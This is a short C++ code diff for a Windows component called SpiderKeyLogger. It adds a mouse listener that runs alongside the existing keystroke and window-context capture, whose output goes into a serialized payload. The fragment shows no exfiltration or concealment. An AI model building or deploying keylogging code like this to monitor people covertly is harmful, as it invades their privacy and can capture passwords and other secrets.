@@ -11,6 +11,8 @@
 #include "WindowsContextAgent.hpp"
 #include "IWindowsKeyListener.hpp"
 #include "WindowsKeyListener.hpp"
+#include "IWindowsMouseListener.hpp"
+#include "WindowsMouseListener.hpp"
 #include "SpiderKeyLoggingPayload.pb.h"
 
 class SpiderKeyLogger : public ISpiderKeyLogger {
@@ -20,6 +22,7 @@ private:
 	std::unique_ptr<IWindowsKeyListener> KeyListener = std::unique_ptr<IWindowsKeyListener>(std::make_unique<WindowsKeyListener>());
 	std::unique_ptr<ISpiderEventListener<SpiderContextChangedEvent>> _eventListener = std::unique_ptr<ISpiderEventListener<SpiderContextChangedEvent>>(std::make_unique<SpiderEventListener<SpiderContextChangedEvent>>());
 	std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(std::make_unique<SpiderEventEmitter>());
+	std::unique_ptr<IWindowsMouseListener> MouseListener = std::unique_ptr<IWindowsMouseListener>(std::make_unique<WindowsMouseListener>());
 
 	std::unique_ptr<SpiderContextChangedEvent> _currentContext = nullptr;
 
@@ -42,6 +45,7 @@ private:
 		});
 
 		ContextAgent->Run();
+		MouseListener->Run();
 		KeyListener->Run(); //This will block current thread.
 	}
 
